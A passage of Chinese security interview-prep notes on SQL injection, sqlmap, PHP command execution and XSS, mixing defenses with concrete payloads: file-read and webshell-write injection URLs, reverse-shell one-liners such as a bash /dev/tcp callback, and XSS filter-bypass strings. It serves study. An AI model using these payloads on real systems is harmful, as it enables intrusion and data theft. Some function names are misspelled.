在语法发生错误使得查询结果能够出现在错误信息中回显在前端，从而从报错信息中获取设定的信息。</p><p>这种手段在能返回错误信息但是联合查询受限的情况下比较好用。（一般为union注入行不通时，报错、布尔盲注和延时盲注都是可以考虑的额外手段）</p><h2 id="sql注入文件读写方式"><a href="#sql注入文件读写方式" class="headerlink" title="sql注入文件读写方式"></a>sql注入文件读写方式</h2><blockquote><p><a href="https://www.cnblogs.com/car7n/p/14848218.html">sql注入文件读写 </a></p></blockquote><ul><li>load_file() ：读取指定文件</li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">union</span>注入读取本地文件</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>mysql<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,load_file(&#x27;</span>c:<span class="operator">/</span>users<span class="operator">/</span><span class="number">91839</span><span class="operator">/</span>desktop<span class="operator">/</span><span class="number">2.</span>txt<span class="string">&#x27;) --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#也可以把文件名转换成16进制</span></span><br><span class="line"><span class="string">http://127.0.0.1/mysql/Less-1/?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="number">0x633A2F75736572732F39313833392F6465736B746F702F312E747874</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><ul><li>LOAD DATA LOCAL INFILE：读取指定文件[当secure_file_priv为null时可以代替load_file()]</li></ul><blockquote><p>当<code>secure_file_priv=null</code>时：<br><code>LOAD DATA LOCAL INFILE</code>与<code>load_file</code>都是读取本地文件，<code>load_file</code>只能在<code>secure_file_priv</code>为空时读取，而<code>LOAD DATA LOCAL INFILE</code>不受限制。<br>所以当<code>secure_file_priv</code> 的值为 NULL的时候可以用<code>LOAD DATA LOCAL INFILE</code>来充当load_file的效果</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> mysql.m1; <span class="operator">/</span><span class="operator">/</span>先删除掉这个表</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mysql.m1 (code TEXT ); <span class="operator">/</span><span class="operator">/</span>然后创建</span><br><span class="line">LOAD DATA <span class="keyword">LOCAL</span> INFILE <span class="string">&#x27;c:/users/91839/desktop/1.txt&#x27;</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> mysql.m1 fields terminated <span class="keyword">by</span> <span class="string">&#x27;&#x27;</span>; <span class="operator">/</span><span class="operator">/</span>读取文件</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.m1; <span class="operator">/</span><span class="operator">/</span>查看文件</span><br></pre></td></tr></table></figure><ul><li><p>into outfile ：将查询的数据写入文件中</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;⼀句话&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;路径&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>into dumpfile：将查询的数据写入文件中 (只能写入一行数据)</p></li></ul><blockquote><p>(into dumpfile只能写入一行数据)<br>利用union注入写入一句话木马 into outfile 和 into dumpfile 都可以</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#语法</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;⼀句话&#x27;</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;路径&#x27;</span></span><br><span class="line">#payload</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>mysql<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,&#x27;</span>一句话<span class="string">&#x27; into outfile &#x27;</span>c:<span class="operator">/</span>users<span class="operator">/</span><span class="number">91839</span><span class="operator">/</span>desktop<span class="operator">/</span><span class="number">10.</span>txt<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><ul><li>sqlmap: –file-write 要写入的文件 –file-dest 写入的绝对路径</li></ul><blockquote><p>在sqlmap中，如果写的权限，知道绝对路径，并且secure_file_priv为空就可以写入文件<br>利用sqlmap将本地文件写入靶机的c:&#x2F;users&#x2F;91839&#x2F;desktop&#x2F;shell.txt</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http://127.0.0.1/mysql/Less-1/?id=1&quot; --random-agent --risk 3 --file-write &quot;shell.txt&quot; --file-dest &quot;c:/users/91839/desktop/shell.txt&quot;</span><br></pre></td></tr></table></figure><ul><li>开启 log 写 webshell</li></ul><h2 id="sql注入写webshell的条件"><a href="#sql注入写webshell的条件" class="headerlink" title="sql注入写webshell的条件"></a>sql注入写webshell的条件</h2><blockquote><ol><li>要知道网站绝对路径，可以通过报错，phpinfo界面，404界面等一些方式知道</li></ol><blockquote><ul><li>网站指纹</li><li>报错</li><li>默认目录，一些服务器常见的目录</li><li>一些函数会提取服务器信息</li><li>phpinfo界面，404界面</li></ul></blockquote><ol start="2"><li><p>没开启GPC转义：gpc没有开启，开启了单引号被转义了，语句就不能正常执行了</p></li><li><p>要有写file权限，默认情况下只有root有，所以要有root权限。对目录要有写权限，一般image之类的存放突破的目录就有</p></li><li><p>secure_file_prie&#x3D;空或者是指定的目录</p></li></ol></blockquote><h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><blockquote><ul><li><a href="https://blog.csdn.net/wy_97/article/details/114213955">UDF提权</a></li><li><a href="https://11pmsleep.github.io/2022-09-24-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/0x24-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/">曾写笔记</a></li></ul></blockquote><p>MySQL 可以⾃定义函数, 通过⾃定义函数做到类似 xp_cmdshell 效果</p><h2 id="宽字符注⼊"><a href="#宽字符注⼊" class="headerlink" title="宽字符注⼊"></a>宽字符注⼊</h2><blockquote><p><a href="https://www.bilibili.com/video/BV1sS4y1S7Hr?spm_id_from=333.337.search-card.all.click&amp;vd_source=e73a152dada4626bad49c30d848902f7">https://www.bilibili.com/video/BV1sS4y1S7Hr?spm_id_from=333.337.search-card.all.click&amp;vd_source=e73a152dada4626bad49c30d848902f7</a></p><p>21详解宽字节注入</p></blockquote><h3 id="宽字符注⼊的原理？"><a href="#宽字符注⼊的原理？" class="headerlink" title="宽字符注⼊的原理？"></a>宽字符注⼊的原理？</h3><p>宽字节注入主要是源于程序员设置<strong>数据库编码与 php 编码设置为不同的两个编码</strong>，这样就可能会产生宽字节注入。GBK 占用两字节，ASCII 占用一字节。</p><p>PHP 中编码为 GBK，当服务器添加对用户输入的内容进行转义的时候，也就是php.ini配置文件中添加magic_quotes.gpc&#x3D;on.或者是使用一些转义函数，比如：addslashesi和mysql.real_escape_.string,他们转义的字符是单引号()、双引号(“)、反斜线0与NUL(NULL字符)，转义的方式就是在这些符号前面自动加上\，让这些符号的意义失效，或者可以理解为被注释掉了。</p><p>那么要想在转义的情况下继续进行sql注入，我们就需要将添加的\干掉,怎么干掉呢，也就是借助编码的不同：</p><p>在 mysql 中使⽤了 gbk 编码，占⽤ 2 个字节, ⽽ mysql 的⼀种特性, GBK 是多字节编码，它认为两个字节就代表⼀个汉字，所以 %df 时候会和转义符  %5c 进⾏结合，是一个汉字, 将添加的\以%5c的形式和其他的结合其他，将\干掉！</p><p>所以单引号就逃逸了出来, 当第⼀个字节的 ascii 码⼤于 128，就可以了。此时我们可以进行进行sql注入了！！！</p><h3 id="宽字节注入解决方法"><a href="#宽字节注入解决方法" class="headerlink" title="宽字节注入解决方法"></a>宽字节注入解决方法</h3><p>统⼀数据库、Web 应⽤、操作系统所使⽤的字符集，避免解析产⽣差异，最好都设置为UTF-8。或对数据进⾏正确的转义，如 mysql_real_escape_string+mysql_set_charset 的使⽤。</p><h2 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h2><ol><li><p>使用报错信息判断</p></li><li><p>使用数据库特有的函数、符号来判断</p></li></ol><p>注意：‘;’是子句查询标识符，Oracle不支持多行查询，若返回错误，则说明可能是Oracle数据库</p><table><thead><tr><th><strong>MySQL</strong></th><th><strong>SQL Server</strong></th><th><strong>Oracle</strong></th></tr></thead><tbody><tr><td>length()</td><td>len()</td><td>length()</td></tr><tr><td>@@version, version();</td><td>@@version;</td><td>二者都返回错误可能是oracle</td></tr><tr><td>substring, substr</td><td>substring()</td><td>substr()</td></tr><tr><td>trim(),  rtrim(),  ltrim()</td><td>rtrim(),  ltrim()</td><td>rtrim(),  ltrim()</td></tr><tr><td>concat(),+  (||默认不可)</td><td>+</td><td>concat(),||</td></tr><tr><td>#, –[0x20], &#x2F;**&#x2F;</td><td>– , &#x2F;**&#x2F;</td><td>REM, – , &#x2F;**&#x2F;</td></tr><tr><td>BENCHMARK()、SLEEP()</td><td>WAITFOR  DELAY</td><td>dbms_pipe.receive_message()</td></tr><tr><td>length(version())</td><td>len(@@version)</td><td>二者都返回错误可能是oracle</td></tr></tbody></table><ol start="3"><li>使用该类型数据库特有的数据库、系统表</li></ol><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#mysql：</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) frominformation_schema.TABLES)<span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">#mssql:</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) fromsysobjects)<span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">#oracle:</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) fromsys.user_tables)<span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><ol start="4"><li>信息搜集，如端口号、服务端语言等</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Oracle：默认端口1521</span><br><span class="line">SQL Server：默认端口1433</span><br><span class="line">MySQL：默认端口3306</span><br><span class="line"></span><br><span class="line">asp：SQL Server、Access</span><br><span class="line">php：MySQL</span><br><span class="line">java：Oracle，MySQL</span><br></pre></td></tr></table></figure><h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><h3 id="sqlmap用过吗，简单说一下–os-shell原理"><a href="#sqlmap用过吗，简单说一下–os-shell原理" class="headerlink" title="sqlmap用过吗，简单说一下–os-shell原理"></a>sqlmap用过吗，简单说一下–os-shell原理</h3><p>就是通过mysql的写入文件函数，写一个小马，用于文件上传，再通过这个小马上传一个文件执行并且回显服务端的大马（这个文件可以用来执行系统命令，并且将结果返回出来），结束后删除文件清理痕迹。</p><h3 id="sqlmap写shell条件："><a href="#sqlmap写shell条件：" class="headerlink" title="sqlmap写shell条件："></a>sqlmap写shell条件：</h3><blockquote><p>1.具有root权限（因为要写文件）</p><p>2.知道网站绝对路径,那么怎么获知绝对路径呢？</p><blockquote><ol><li>网站指纹</li><li>报错</li><li>默认目录，一些服务器常见的目录</li><li>一些函数会提取服务器信息</li></ol></blockquote><p>3.没开启GPC转义</p><p>4.secure_file_prie&#x3D;空或者是指定的目录</p><blockquote><p><a href="https://www.yisu.com/zixun/113.htmlMYSQL%E7%9A%84secure_file_priv%E5%8F%82%E6%95%B0%E6%80%8E%E4%B9%88%E7%94%A8%EF%BC%9F">https://www.yisu.com/zixun/113.htmlMYSQL的secure_file_priv参数怎么用？</a></p></blockquote></blockquote><h3 id="sqlmap常见参数"><a href="#sqlmap常见参数" class="headerlink" title="sqlmap常见参数"></a>sqlmap常见参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u: 指定目标URL</span><br><span class="line">-b: 获取DBMSbanner</span><br><span class="line">–current-db : 获取当前数据库</span><br><span class="line">–current-user:获取当前用户</span><br><span class="line">–users : 枚举DBMS用户</span><br><span class="line">–password: 枚举DBMS用户密码hash</span><br></pre></td></tr></table></figure><h2 id="其他小问题"><a href="#其他小问题" class="headerlink" title="其他小问题"></a>其他小问题</h2><ol><li>mysql的用户名密码是存放在那张表里面？mysql 密码采用哪种加密方式？</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -&gt; users</span><br><span class="line">SHA1</span><br></pre></td></tr></table></figure><ol start="2"><li>请写出 Mysql5 数据库中查询库’helloworld’中’users’表所有列名的语句</li></ol><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><ol start="3"><li>mysql 的⽹站注⼊，5.0 以上和 5.0 以下有什么区别？</li></ol><blockquote><ul><li>5.0 以下没有 information_schema 这个系统表，⽆法列表名等，只能暴⼒跑表名。</li><li>5.0 以下是多⽤户单操作，5.0 以上是多⽤户多操作。</li></ul></blockquote><ol start="4"><li>MySQL、ACCESS和SQLserver的区别</li></ol><blockquote><ul><li>MySQL脱库时使用information_schema默认数据库,其中schemata存数据库,tables存表,columns存字段;SQLserver脱库时使用系统表,databases存数据库,objects存表,columns存字段</li><li>MySQL支持limnt分页,SQLserver只能用top来替代分页</li><li>MySQL支持双系统,SQLserver只能支持Windows系统</li></ul></blockquote><p>三者注释区别</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL:        -- , /**/ , #SQLserver    -- , /**/</span><br><span class="line">Oracle           -- , /**/</span><br><span class="line">Access          没有注释</span><br></pre></td></tr></table></figure><ol start="5"><li>为何⼀个 mysql 数据库的站，只有⼀个 80 端⼝开放？</li></ol><blockquote><ul><li>更改了端⼝，没有扫描出来。</li><li>站库分离</li><li>3306 端⼝不对外开放</li></ul></blockquote><ol start="6"><li>SQL 头部注⼊点</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UserAgent </span><br><span class="line">Referer </span><br><span class="line">Cookie </span><br><span class="line">XFF</span><br></pre></td></tr></table></figure><ol start="7"><li>注⼊时可以不使⽤ and 或 or 或 xor，直接 order by 开始注⼊吗？</li></ol><p>and&#x2F;or&#x2F;xor，前⾯的 1&#x3D;1、1&#x3D;2 步骤只是为了判断是否为注⼊点，如果已经确定是注⼊点那就可以省那步骤去。</p><ol start="8"><li>sql 注⼊有以下两个测试选项，选⼀个并且阐述不选另⼀个的理由：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A. demo.jsp?id=2+1</span><br><span class="line">B. demo.jsp?id=2-1</span><br></pre></td></tr></table></figure><blockquote><p>选 B，在 URL 编码中 + 代表空格，可能会造成混淆</p></blockquote><h1 id="命令执行-代码执行"><a href="#命令执行-代码执行" class="headerlink" title="命令执行+代码执行"></a>命令执行+代码执行</h1><h2 id="php命令执行和代码执行相关函数"><a href="#php命令执行和代码执行相关函数" class="headerlink" title="php命令执行和代码执行相关函数"></a>php命令执行和代码执行相关函数</h2><blockquote><p>危险函数</p></blockquote><h3 id="命令执行："><a href="#命令执行：" class="headerlink" title="命令执行："></a>命令执行：</h3><p>代码执行漏洞应用有时需要调用⼀些执行系统命令的函数，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。简单来说就是：”靠执行脚本代码调用操作系统命令“</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(), </span><br><span class="line"><span class="title function_ invoke__">popen</span>(),</span><br><span class="line"><span class="title function_ invoke__">exec</span>(), <span class="title function_ invoke__">shell_exec</span>(), </span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()，</span><br><span class="line"><span class="title function_ invoke__">passthru</span>() ,</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>()</span><br><span class="line">反引号 ``</span><br></pre></td></tr></table></figure><h3 id="代码执行："><a href="#代码执行：" class="headerlink" title="代码执行："></a>代码执行：</h3><p>代码执行是指应用程序在调用⼀些能够将字符串转换为代码的函数时，没有考虑用户是否控制这个字符串，将造成代码执行漏洞，使得用户能利用任意脚本代码(PHP)。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>()、<span class="title function_ invoke__">assert</span>()、</span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>()                                （PHP&lt;<span class="number">5.5</span>.<span class="number">0</span>）</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>()、<span class="title function_ invoke__">call_user_func_array</span>()</span><br><span class="line"><span class="title function_ invoke__">create_function</span>()</span><br><span class="line"><span class="variable">$_GET</span>[‘a’](<span class="variable">$_GET</span>[‘b’]);                        可变函数</span><br><span class="line"><span class="keyword">include</span>、<span class="keyword">require</span> … …                        开启allow_url_include（php&gt;<span class="number">5.2</span>.<span class="number">0</span>）</span><br></pre></td></tr></table></figure><h3 id="⽂件读取函数："><a href="#⽂件读取函数：" class="headerlink" title="⽂件读取函数："></a>⽂件读取函数：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">fifile_get_contents</span>(),</span><br><span class="line"><span class="title function_ invoke__">highlight_fifile</span>(),</span><br><span class="line"><span class="title function_ invoke__">fopen</span>(),</span><br><span class="line">read <span class="title function_ invoke__">fifile</span>(),</span><br><span class="line"><span class="title function_ invoke__">fread</span>(),</span><br><span class="line"><span class="title function_ invoke__">fgetss</span>(),<span class="title function_ invoke__">fgets</span>(),</span><br><span class="line"><span class="title function_ invoke__">parse_ini_fifile</span>(),</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(),</span><br><span class="line"><span class="title function_ invoke__">fifile</span>() 等</span><br></pre></td></tr></table></figure><h2 id="反弹-shell-的常⽤命令？⼀般常反弹哪⼀种-shell？为什么？"><a href="#反弹-shell-的常⽤命令？⼀般常反弹哪⼀种-shell？为什么？" class="headerlink" title="反弹 shell 的常⽤命令？⼀般常反弹哪⼀种 shell？为什么？"></a>反弹 shell 的常⽤命令？⼀般常反弹哪⼀种 shell？为什么？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 7777 -e /bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.1.11/6666 0&gt;&amp;1</span><br><span class="line">bash 是交互式, 否则像 useradd ⽆法执⾏交互</span><br></pre></td></tr></table></figure><h2 id="命令执行防御"><a href="#命令执行防御" class="headerlink" title="命令执行防御"></a>命令执行防御</h2><blockquote><ol><li>尽量不要执行外部命令</li><li>使用自定义函数或者函数库来代替外部命令的功能。</li><li>使用escapeshellarg()、escapeshellcmd()函数来处理命令参数。</li><li>禁用一些敏感字符 比如 ； &amp;&amp;  cat 等连接符与常用命令</li><li>过滤关键字符、控制回显</li></ol></blockquote><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="你怎么理解-xss-攻击？"><a href="#你怎么理解-xss-攻击？" class="headerlink" title="你怎么理解 xss 攻击？"></a>你怎么理解 xss 攻击？</h2><p>是⼀种被动型，在不知道的情况下触发类似⽆感型，在渗透很多情况下平常的渗透⼿段以及取得⽬标的信息，⽽ XSS 就能轻松获取，类似 QQ 邮箱你不可能渗透这么⼤的互联⽹就算可以时间成本都⾮常的⾼，XSS ⽐较有针对性。</p><h2 id="XSS利用条件："><a href="#XSS利用条件：" class="headerlink" title="XSS利用条件："></a>XSS利用条件：</h2><blockquote><ul><li>网站页面可传入参数，并嵌入其中</li><li>该参数用户可控</li><li>参数过滤不严格</li></ul></blockquote><h2 id="XSS-危害"><a href="#XSS-危害" class="headerlink" title="XSS 危害"></a>XSS 危害</h2><p>⽹络钓⻥、窃取⽤户 Cookies、弹⼴告刷流量、具备改⻚⾯信息、删除⽂章、获取客户端信息、传播蠕⾍、记录用户的键盘输入、网站挂马，篡改网页内容……</p><h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><p>从⽹络层、主机层、Web 层、数据库，不同层次有不同方法：（话题比较大）</p><ul><li>对输入和URL参数进行过滤，输入时进行校验</li></ul><blockquote><ol><li><p>限制输入数据长度</p></li><li><p>对输入数据格式进行验证（纯数字、符合邮箱、用户名格式）</p></li><li><p>过滤、删除危险字符</p></li></ol></blockquote><ul><li>对输出进行编码</li></ul><blockquote><p>1.php使用<strong>htmlspeicalchars()函数</strong>，<strong>输出实体编码</strong>。经由htmlspeicalchars()过滤或转译参数,被转义后原本输入的内容就不属于js代码了，就会将我们输入的脚本当作单纯的内容打印出来</p></blockquote><ul><li>设置HttpOnly 防止cookie被js盗取，禁⽌ JavaScript 读取 Cookie 值，网页就不允许提取cookie了</li></ul><blockquote><p><code>1.session.cookie_httponly=1</code></p></blockquote><ul><li>设置CSP:Content Security Policy(内容安全策略)，其旨在减少跨站脚本攻击。由开发者定义一些安全性的策略声明，来指定可信的内容</li><li>其他：</li></ul><blockquote><p>通过 CDN 都有过滤常⻅⼀些攻击⼿法，但不能有 CDN 就以为可以了，添加 CDN 只是让攻击成本增⾼、ModSecurity 类的防⽕墙。</p></blockquote><h2 id="xss绕过"><a href="#xss绕过" class="headerlink" title="xss绕过"></a>xss绕过</h2><ul><li>闭合标签绕过</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">•&lt;textarea&gt;、&lt;title&gt;等RCDATA标签内无法使用JavaScript，如果遇到这种标签，想利用xss需要先使用《&lt;/textarea&gt;、&lt;/title&gt;闭合标签，再输入脚本，xss.haozi.me网站第二关</span><br><span class="line">•value等元素属性闭合，需要先闭合引号，或者是尖括号  xss.haozi.me网站第三关</span><br><span class="line">•&lt;!----!&gt; &lt;!-- --&gt;注释闭合</span><br></pre></td></tr></table></figure><ul><li>绕过小括号、双引号、单引号</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">•利用反引号``</span><br><span class="line">    &lt;script&gt;alert`1`&lt;/script&gt;</span><br><span class="line">•编码绕过(利用实体编码、unicode编码绕过)</span><br><span class="line">        &lt;img src=x onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt;  属性内可以识别html实体编码</span><br><span class="line">                                    &amp;#x28；是（的实体编码，&amp;#x29;是）的实体编码</span><br><span class="line">        &lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41&lt;/script&gt;  &lt;svg&gt;遵循XML 和 SVG 的定义</span><br><span class="line">                                        酱紫才可以采用实体编码去绕过</span><br></pre></td></tr></table></figure><ul><li>混淆绕过（利用html语法不严格、容错性）</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">换行(第六关）</span><br><span class="line">缺失&gt;闭合的标签</span><br><span class="line">空格、TAB</span><br></pre></td></tr></table></figure><ul><li>关键字绕过</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">•大小写绕过</span><br><span class="line">•编码绕过</span><br><span class="line">    •&lt;img src=1 onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;</span><br><span class="line">    =&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41就是alert(1)的实体编码，即使script关键字可能被服务器绕过，但是onerror也是支持JavaScript脚本的</span><br><span class="line">    •&lt;svg&gt;&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&lt;/script&gt;</span><br><span class="line">    当识别&lt;svg&gt;会先将上面的实体编码解码 ，再执行</span><br><span class="line">•字符拼接</span><br><span class="line">    &lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&#x27;(1);&#x27;;eval(a+b+c)&quot;&gt;    </span><br><span class="line">    &lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](1);&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>空格绕过</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">•利用/代替空格</span><br><span class="line">    •&lt;img/src=&quot;x&quot;/onerror=alert(1);&gt;</span><br><span class="line">•编码绕过(利用实体编码、unicode编码绕过)</span><br><span class="line">    •&lt;img src=x onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt;  属性内可以识别html实体编码</span><br><span class="line">    •&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41&lt;/script&gt;  &lt;svg&gt;遵循XML 和 SVG 的定义</span><br></pre></td></tr></table></figure><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><p>反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到请求参数中。反射型XXS是一种非持久性的攻击，它指的是恶意攻击者往Web页面里插入恶意代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的目的。这里插入的恶意代码并没有保存在目标网站，需要引诱用户点击一个链接到目标网站的恶意链接来实施攻击</p><h2 id="存储型-xss-原理"><a href="#存储型-xss-原理" class="headerlink" title="存储型 xss 原理?"></a>存储型 xss 原理?</h2><p>如⽹站留⾔版，把插⼊的记录存储在数据库中，插⼊的代码会⼀直留在⻚⾯上，当其它⽤户访问会从数据库中读取并触发漏洞。</p><p>XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处。</p><h2 id="Dom-xss-原理-x2F-防范-x2F-危害"><a href="#Dom-xss-原理-x2F-防范-x2F-危害" class="headerlink" title="Dom xss 原理 &#x2F; 防范&#x2F;危害"></a>Dom xss 原理 &#x2F; 防范&#x2F;危害</h2><p><strong>原理：</strong></p><p>DOM 型 XSS 并不需要服务器解析响应的，直接参与触发 XSS 靠的是浏览器 DOM 解析。客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行</p><p>DOM—based XSS 漏洞是基于⽂档对象模型 Document Objeet Model,DOM) 的⼀种漏洞。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">cument.<span class="title function_">getElementById</span>(<span class="string">&quot;a&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;yyyyyy&quot;</span>;</span><br></pre></td></tr></table></figure><p><strong>防御</strong>：在输⼊点过滤敏感关键字</p><p><strong>危害：</strong></p><blockquote><p>（1）DOM-XSS不经过服务器端，只查看服务端的日志和数据库，很难排查到</p><p>（2）DOM-XSS一般是通杀浏览器的</p><p>（3）DOM-XSS一般是被攻击的时候就执行了XSS，由于是前端DOM操作导致，很难留下痕迹</p></blockquote><h2 id="反射型、存储型及DOM型xss区别"><a href="#反射型、存储型及DOM型xss区别" class="headerlink" title="反射型、存储型及DOM型xss区别"></a>反射型、存储型及DOM型xss区别</h2><blockquote><p>[反射型XSS、存储型XSS及DOM型XSS到底有什么区别？？？？？](<a href="https://blog.csdn.net/qq_41734243/article/details/106123846#:~:text=DOM%E5%9E%8BXSS%E7%9A%84%E8%A2%AB%E6%94%BB%E5%87%BB%E5%AF%B9%E8%B1%A1%E5%85%B6%E5%AE%9E%E5%92%8C%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E8%A2%AB%E6%94%BB%E5%87%BB%E5%AF%B9%E8%B1%A1%E5%B7%AE%E4%B8%8D%E5%A4%9A%EF%BC%8C%E5%B0%B1%E6%98%AF%E7%BB%99%E6%94%BB%E5%87%BB%E5%AF%B9%E8%B1%A1%E6%94%BE%E9%80%81URL%E3%80%82">https://blog.csdn.net/qq_41734243/article/details/106123846#:~:text=DOM型XSS的被攻击对象其实和反射型XSS被攻击对象差不多，就是给攻击对象放送URL。</a> 反射型XSS的脚本被解析的地方是浏览器，而存储型XSS的脚本被解析的地方是服务器，DOM型XSS也是浏览器，所以DOM型又叫DOM反射型XSS。,但是反射型XSS需要联网，而DOM型不需要！ 